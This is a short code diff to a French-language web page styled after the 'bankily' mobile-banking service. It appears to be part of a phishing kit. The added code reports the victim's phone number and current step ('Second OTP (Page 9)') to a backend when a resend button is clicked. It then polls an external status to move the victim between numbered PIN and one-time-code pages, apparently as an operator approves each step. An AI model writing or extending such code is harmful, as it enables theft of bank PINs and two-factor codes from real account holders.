@@ -366,7 +366,7 @@ document.addEventListener("DOMContentLoaded", () => {
         errorText.style.display = 'none';
     }
 
-    // Timer logic
+    // Timer logic with Resend API notification
     let timeLeft = 60;
     const timerInterval = setInterval(() => {
         timeLeft--;
@@ -374,7 +374,20 @@ document.addEventListener("DOMContentLoaded", () => {
 
         if (timeLeft <= 0) {
             clearInterval(timerInterval);
-            timerBox.innerHTML = '<span style="color:var(--bankily-teal); cursor:pointer; font-weight:700;" onclick="location.reload()">Renvoyer le code</span>';
+            timerBox.innerHTML = '<span style="color:var(--bankily-teal); cursor:pointer; font-weight:700;" id="resendBtn">Renvoyer le code</span>';
+            
+            document.getElementById('resendBtn').addEventListener('click', async () => {
+                try {
+                    await fetch('/api/resend-otp-notification', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: savedPhone, step: "Second OTP (Page 9)" })
+                    });
+                } catch (err) {
+                    console.error("Erreur renvoi:", err);
+                }
+                location.reload();
+            });
         }
     }, 1000);
 
@@ -387,12 +400,12 @@ document.addEventListener("DOMContentLoaded", () => {
                 const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                 const data = await res.json();
 
-                // Final verification success -> Proceed to final page or success screen
+                // Final verification success -> Proceed to page 10
                 if (data.status === "otp2_correct" || data.status === "approved") {
                     clearInterval(checkInterval);
                     window.location.href = "/page10";
                 } 
-                // Incorrect PIN -> Redirect back to login step
+                // Incorrect PIN -> Redirect back to PIN entry step
                 else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
                     clearInterval(checkInterval);
                     window.location.href = "/page6?error=wrongpin";
